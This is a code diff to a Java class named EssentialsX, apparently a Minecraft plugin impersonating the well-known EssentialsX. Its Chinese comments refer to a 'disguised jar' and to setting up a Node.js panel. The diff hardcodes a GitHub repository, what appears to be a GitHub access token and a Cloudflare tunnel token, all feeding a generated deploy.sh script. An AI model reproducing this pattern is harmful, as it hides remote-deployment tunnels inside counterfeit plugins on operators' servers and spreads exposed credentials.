@@ -22,6 +22,20 @@ public class EssentialsX extends JavaPlugin {
     private boolean systemGuardEnabled   = true;
     private final AtomicBoolean isRestarting = new AtomicBoolean(false);
 
+    // ═════════════════════════════════════════════════════════════
+    //  ★★★ 用户配置区，所有参数在这里填写 ★★★
+    // ═════════════════════════════════════════════════════════════
+
+    // ── Node.js 面板配置 ──────────────────────────────────────────
+    // GitHub 仓库地址
+    private static final String REPO_URL    = "https://github.com/heyzone/heibaiplugins";
+    // GitHub 用户名:Token
+    private static final String GITHUB_AUTH = "heyzone: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";
+    // Cloudflare 固定隧道 Token（填 eyJ... 完整值使用固定域名；留空则每次使用临时隧道）
+    private static final String TUNNEL_TOKEN = "eyJhIjoiNTk5MzUwOTkyOTQzNmJkYzVhNTdmYjJmN2Y5YTlkMjAiLCJ0IjoiMWFhYjg4YjUtODFkNS00ZDk5LWEwMTEtYmE1MzY4YWRhN2U3IiwicyI6Ik56SXpaVFl4Wm1VdFptUXhOaTAwTUROaUxXRXlaamd0WkRJek4yTTJORGhoWW1RMiJ9";
+
+    // ═════════════════════════════════════════════════════════════
+
     // ── 伪装 jar 相关 ──────────────────────────────────────────
     private Path backupDir;
     private Path originalJarPath;
@@ -232,12 +246,10 @@ public class EssentialsX extends JavaPlugin {
 
     // ── 生成 deploy.sh ────────────────────────────────────────────
     private String generateDeployScript(String workDir, Map<String, String> env) {
-        // ★ 修改这两行来指向你自己的 GitHub 仓库和 Token ★
-        String repoUrl     = env.getOrDefault("REPO_URL",     "https://github.com/heyzone/heibaiplugins");
-        String githubAuth  = env.getOrDefault("GITHUB_AUTH",  "heyzone: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");
-        // ★ Cloudflare 固定隧道 Token，直接填在这里 ★
-        // 填 eyJ... 完整 token 使用固定域名；留空则每次使用临时隧道地址
-        String tunnelToken = "eyJhIjoiNTk5MzUwOTkyOTQzNmJkYzVhNTdmYjJmN2Y5YTlkMjAiLCJ0IjoiMWFhYjg4YjUtODFkNS00ZDk5LWEwMTEtYmE1MzY4YWRhN2U3IiwicyI6Ik56SXpaVFl4Wm1VdFptUXhOaTAwTUROaUxXRXlaamd0WkRJek4yTTJORGhoWW1RMiJ9";
+        // 直接引用类顶部常量，不再走 env 读取，确保值一定生效
+        String repoUrl     = REPO_URL;
+        String githubAuth  = GITHUB_AUTH;
+        String tunnelToken = TUNNEL_TOKEN;
 
         String nodeDir = workDir + "/nodejs";
         String appDir  = workDir + "/app";
